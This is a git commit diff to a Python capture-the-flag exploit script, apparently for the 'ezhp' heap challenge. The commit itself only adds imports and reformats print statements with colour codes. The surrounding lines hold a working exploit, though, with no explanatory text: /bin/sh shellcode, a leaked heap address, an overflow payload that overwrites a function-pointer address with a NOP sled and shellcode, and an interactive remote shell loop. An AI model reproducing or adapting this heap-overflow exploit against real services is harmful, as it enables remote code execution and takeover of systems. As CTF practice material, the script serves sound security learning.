c66c4059367cf9a1a17c3d52870196d9eac495f0
bu6hunt3r <Felix1Koch@gmail.com>
2017-01-28 17:33:00 +0100

    added diverse CTF things

--- my_ezhp_sploit.py
+++ my_ezhp_sploit.py
@@ -3,6 +3,8 @@
 import socket
 import struct
 import time
+import sys
+import pwn
 
 # 23bit classic /bin/sh
 shellcode = "\x31\xc0\x50\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80"
@@ -24,22 +26,22 @@ send(s, "4\n0\n")
 buf = s.recv(1024)
 idx = buf.find('A'*16) + 16
 heap = struct.unpack('<L', buf[idx:idx+4])[0]
-print '[+] Heap address : %s' % hex(heap)
+print( '\033[0;32m[+] Heap address : %s' % hex(heap))
 send(s, "3\n0\n1337\n")
 
-print '[+] Sending payload'
+print( '[+] Sending payload')
 send(s, 16*'A' + struct.pack('<L', heap) + struct.pack('<L', 0x804a010 - 4) + '\x90'*(16+4+4+1) + shellcode)
 
-raw_input("Continue?")
-print '[+] Corrupting (again) second chunk'
+raw_input("Continue? " )
+print( '[+] Corrupting (again) second chunk')
 send(s, "2\n1\n")
 
-print '[+] Triggering vuln'
+print( '[+] Triggering vuln')
 send(s, "1337\n")  # Invalid choice, this will call exit(3)
 s.recv(1024)
 
-print '[+] shell!'
+print( '[+] shell!\033[0m')
 while 1:
-    s.send(raw_input('$ ') + '\n')
+    s.send(raw_input('\033[1;31m$ \033[0m') + '\n')
     print s.recv(1024)
 
